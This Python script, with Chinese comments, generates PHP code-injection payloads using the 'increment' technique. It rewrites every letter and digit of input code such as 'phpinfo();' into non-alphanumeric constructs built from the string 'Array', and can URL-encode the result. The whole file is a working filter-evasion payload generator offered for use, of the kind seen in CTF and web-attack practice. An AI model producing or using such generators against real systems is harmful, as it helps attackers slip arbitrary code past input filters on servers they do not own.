#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
gen_inc.py  ---  自增法 payload 生成器

把输入代码里的【字母和数字】替换成自增构造, 其余字符原样保留。
字母: 从 "Array" 取出 'A'(下标0) / 'a'(下标3) 作基座, 逐次 ++ 拼出。
数字: 自增拼不出数字, 用布尔算术 "" . (true+true+...) == "2" 补齐。

因为 ++ 是语句而不是表达式, 生成结果 = 前缀(构造变量) + 改写后的代码。

输入:  phpinfo();
输出:  $_=[];$_=@"$_";$__=$_[!![]];...$_____='';...;$_____();

用法:
    python gen_inc.py "phpinfo();"
    python gen_inc.py -u "phpinfo();"      # 追加输出 URL 编码形态
    echo "phpinfo();" | python gen_inc.py
"""
import sys
import string
import urllib.parse

ALNUM = set(string.ascii_letters + string.digits)
ID_START = set(string.ascii_letters) | {"_"}
ID_CHAR = set(string.ascii_letters + string.digits) | {"_"}
DIGITS = set(string.digits)

# 内部保留变量
V_ARRY = "$_"        # "Array"
V_UP = "$__"         # 'A'
V_LO = "$___"        # 'a'
V_SCRATCH = "$____"  # 计数器
TARGET_BASE = 5      # 目标字符串变量从 5 个下划线开始


def phpq(c):
    if c == "'":
        return '"\'"'
    if c == '"':
        return "'\"'"
    if c == "\\":
        return '"\\\\"'
    return "'" + c + "'"


def var_for(idx):
    return "$" + "_" * (TARGET_BASE + idx)


def scan(code):
    """切成 token: ('lit'|'var'|'run'|'raw', text)"""
    toks = []
    i, n = 0, len(code)
    while i < n:
        c = code[i]
        if c in "'\"":
            j = i + 1
            buf = []
            while j < n and code[j] != c:
                if code[j] == "\\" and j + 1 < n:
                    buf.append(code[j + 1])
                    j += 2
                    continue
                buf.append(code[j])
                j += 1
            toks.append(("lit", "".join(buf)))
            i = j + 1
            continue
        if c == "$":
            k = i + 1
            j = k
            while j < n and code[j] in ID_CHAR:
                j += 1
            if j > k:
                toks.append(("var", code[k:j]))
                i = j
                continue
            toks.append(("raw", c))
            i += 1
            continue
        if c in ID_START:
            j = i
            while j < n and code[j] in ID_CHAR:
                j += 1
            toks.append(("run", code[i:j]))
            i = j
            continue
        if c in DIGITS:
            j = i
            while j < n and code[j] in DIGITS:
                j += 1
            toks.append(("run", code[i:j]))
            i = j
            continue
        toks.append(("raw", c))
        i += 1
    return toks


def build_var(var, text):
    """生成把 text 装进 var 的语句"""
    code = [var + "='';"]
    for ch in text:
        if ch.isdigit():
            n = int(ch)
            expr = '("" . (![] - ![]))' if n == 0 else \
                   '("" . (' + ' + '.join(['![]'] * n) + '))'
            code.append(var + ".=" + expr + ";")
            continue
        if ch.isalpha():
            base = V_LO if ch.islower() else V_UP
            ref = 'a' if ch.islower() else 'A'
            n = ord(ch) - ord(ref)
            if not 0 <= n <= 25:
                raise ValueError("偏移超范围: %r" % ch)
            code.append(V_SCRATCH + "=" + base + ";")
            code.append((V_SCRATCH + "++;") * n)
            code.append(var + ".=" + V_SCRATCH + ";")
            continue
        code.append(var + ".=" + phpq(ch) + ";")
    return "".join(code)


def translate(code):
    toks = scan(code)

    # 收集需要构造的字符串, 去重保序
    targets = []
    for kind, text in toks:
        if kind in ("lit", "var", "run") and text not in targets:
            targets.append(text)

    vmap = {t: var_for(i) for i, t in enumerate(targets)}

    # 前缀: 造 "Array" 并取出两个基座
    pre = (V_ARRY + "=[];"
           + V_ARRY + '=@"' + V_ARRY + '";'
           + V_UP + "=" + V_ARRY + "[!![]];"
           + V_LO + "=" + V_ARRY + "[![]+![]+![]];")
    for t in targets:
        pre += build_var(vmap[t], t)

    # 改写代码
    out = []
    for kind, text in toks:
        if kind == "var":
            out.append("${" + vmap[text] + "}")
        elif kind in ("lit", "run"):
            out.append(vmap[text])
        else:
            out.append(text)
    return pre + "".join(out)


def main():
    args = sys.argv[1:]
    url = False
    if "-u" in args:
        url = True
        args.remove("-u")
    code = args[0] if args else sys.stdin.read()
    code = code.rstrip("\r\n")
    p = translate(code)
    print(p)
    if url:
        print()
        print(urllib.parse.quote(p, safe=""))


if __name__ == "__main__":
    main()
